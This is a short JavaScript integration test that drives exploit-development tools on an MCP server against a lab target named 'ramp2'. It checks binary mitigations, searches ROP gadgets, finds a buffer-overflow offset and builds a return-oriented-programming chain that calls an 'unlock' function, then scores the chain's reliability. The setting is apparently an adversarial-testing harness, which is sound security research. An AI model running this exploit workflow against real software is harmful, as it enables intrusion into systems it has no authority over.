// Integration test of the ROP tools against ramp2 (NX on, no zero-arg win).
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const DIR = "/Users/kgalappatti/Apps/aegis-research/adversarial-harness/spike/develop-seam";
const transport = new StdioClientTransport({
  command: "node", args: ["server.js"], cwd: DIR,
  env: { ...process.env, SEAM_MODE: "enforcing", SPIKE_TARGET: "/work/ramp2",
    MEDIATION_LOG: `${DIR}/ramp2.log`, AEGIS_MARKER_KEY: "ramp2-key" },
});
const client = new Client({ name: "t", version: "0" }, { capabilities: {} });
await client.connect(transport);
const j = (r) => JSON.parse(r.content[0].text);

const mit = j(await client.callTool({ name: "mitigation_check", arguments: {} }));
console.log("mitigation_check: nx=%s pie=%s canary=%s", mit.nx, mit.pie, mit.canary);

const gs = j(await client.callTool({ name: "gadget_search", arguments: { query: "x0, x30" } }));
const gadget = gs.gadgets.find((g) => /^ldp x0, x30, \[sp\][^;]*; ret$/.test(g.insns.trim()));
console.log("gadget_search: found", gs.count, "clean gadget ->", gadget && gadget.addr, gadget && gadget.insns);

const off = j(await client.callTool({ name: "find_offset", arguments: { length: 200 } })).offset;
console.log("find_offset ->", off);

const ex = j(await client.callTool({ name: "build_rop_call",
  arguments: { offset: off, gadget_addr: gadget.addr_int, func: "unlock", arg: 0xc0ffee, times: 5 } }));
console.log("build_rop_call:", JSON.stringify(ex.chain), "fires=%d/%d reliability=%s", ex.fires, ex.times, ex.reliability);

await client.close();
const ok = mit.nx === true && gadget && off === 72 && ex.reliability === 1.0;
console.log("\nRAMP2 TEST:", ok ? "PASS" : "FAIL");
process.exit(ok ? 0 : 1);
